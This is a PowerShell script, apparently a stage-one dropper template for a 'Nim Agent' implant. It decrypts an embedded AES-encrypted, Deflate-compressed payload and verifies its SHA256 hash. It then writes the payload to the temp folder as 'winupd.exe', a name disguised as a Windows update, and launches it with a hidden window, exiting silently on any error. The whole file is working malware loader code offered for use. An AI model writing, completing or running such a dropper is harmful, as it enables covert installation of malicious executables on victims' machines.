# template.ps1 — Stage 1 for Nim Agent with AES decryption, SHA256 integrity, zlib, and stealth

Add-Type -AssemblyName System.IO.Compression.FileSystem
Add-Type -AssemblyName System.Security

function Decrypt-AES {
    param (
        [string]$Base64Data,
        [string]$IVHex,
        [byte[]]$Key
    )

    $iv = [byte[]]::new(16)
    for ($i = 0; $i -lt 16; $i++) {
        $iv[$i] = [Convert]::ToByte($IVHex.Substring($i * 2, 2), 16)
    }

    $cipherBytes = [Convert]::FromBase64String($Base64Data)
    $aes = [System.Security.Cryptography.Aes]::Create()
    $aes.Mode = 'CBC'
    $aes.Padding = 'PKCS7'
    $aes.Key = $Key
    $aes.IV = $iv

    $decryptor = $aes.CreateDecryptor()
    $ms = New-Object System.IO.MemoryStream
    $cs = New-Object System.Security.Cryptography.CryptoStream($ms, $decryptor, [System.Security.Cryptography.CryptoStreamMode]::Write)
    $cs.Write($cipherBytes, 0, $cipherBytes.Length)
    $cs.Close()

    return $ms.ToArray()
}

function Decompress-Data {
    param ([byte[]]$Data)
    $compressedStream = New-Object System.IO.MemoryStream(,$Data[32..($Data.Length - 1)])
    $outputStream = New-Object System.IO.MemoryStream
    $deflateStream = New-Object System.IO.Compression.DeflateStream($compressedStream, [System.IO.Compression.CompressionMode]::Decompress)
    $deflateStream.CopyTo($outputStream)
    $deflateStream.Close()
    return ,@($outputStream.ToArray(), $Data[0..31])
}

function Verify-Hash {
    param ([byte[]]$Plain, [byte[]]$Hash)
    $sha256 = [System.Security.Cryptography.SHA256]::Create()
    $computed = $sha256.ComputeHash($Plain)
    return ($computed -join '') -eq ($Hash -join '')
}

$payload = "REPLACE_AES"
$keyHex = "REPLACE_KEY"
$key = [byte[]]::new(32)
for ($i = 0; $i -lt 32; $i++) {
    $key[$i] = [Convert]::ToByte($keyHex.Substring($i * 2, 2), 16)
}

$parts = $payload.Split(":")
$ivHex = $parts[0]
$encData = $parts[1]

try {
    $decrypted = Decrypt-AES -Base64Data $encData -IVHex $ivHex -Key $key
    $result = Decompress-Data -Data $decrypted
    $raw = $result[0]
    $hash = $result[1]

    if (-not (Verify-Hash -Plain $raw -Hash $hash)) {
        exit 1
    }

    $temp = "$env:TEMP\\winupd.exe"
    [System.IO.File]::WriteAllBytes($temp, $raw)
    Start-Process -FilePath $temp -WindowStyle Hidden
} catch {
    exit 1
}
